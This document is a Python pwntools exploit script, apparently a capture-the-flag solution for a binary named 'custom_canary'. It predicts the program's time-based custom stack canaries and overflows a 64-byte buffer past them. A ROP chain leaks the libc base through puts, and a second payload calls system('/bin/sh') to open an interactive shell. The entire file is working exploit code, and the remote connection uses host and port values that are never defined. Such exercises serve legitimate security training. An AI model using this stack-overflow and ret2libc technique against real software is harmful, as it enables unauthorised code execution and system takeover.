from pwn import *
import time

elf = context.binary = ELF('./custom_canary')
libc = ELF('./libc-2.27.so')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x4012ba
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

# Any number larger than 100
seed = 128
canaries_addr = 0x402020

def canary_calc(time, id):
    ind = ((id % 10 + time) - (id % 100)) % 0x640
    canary = elf.read(canaries_addr + ind * 8, 8)
    canary = u64(canary)
    return canary

p.recvuntil('Please provide your Custom Canary')
p.sendline(str(seed))

time = int(time.time())


# Canary calculation
canary_one = canary_calc(time, seed)
canary_two = canary_calc(time, seed ^ 0xdead)

log.info('Canary 1: {}'.format(hex(canary_one)))
log.info('Canary 2: {}'.format(hex(canary_two)))

POP_RDI = p64(0x0000000000401433)


# Leak libc base
p.recvuntil('Alright, go ahead and try to bypass the canary:\n')
payload = 'A' * 64 + p64(canary_two) + p64(canary_one) + p64(0) + POP_RDI + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(0x4012ba)
p.sendline(payload)

leak = u64(p.recvline().strip().ljust(8, '\x00'))
libc_base = leak - libc.sym['puts']
log.info('Libc Base: {}'.format(hex(libc_base)))

# Execute bash
RET = p64(0x000000000040101a)
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
payload = 'A' * 64 + p64(canary_two) + p64(canary_one) + p64(0) + RET + POP_RDI + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
p.close()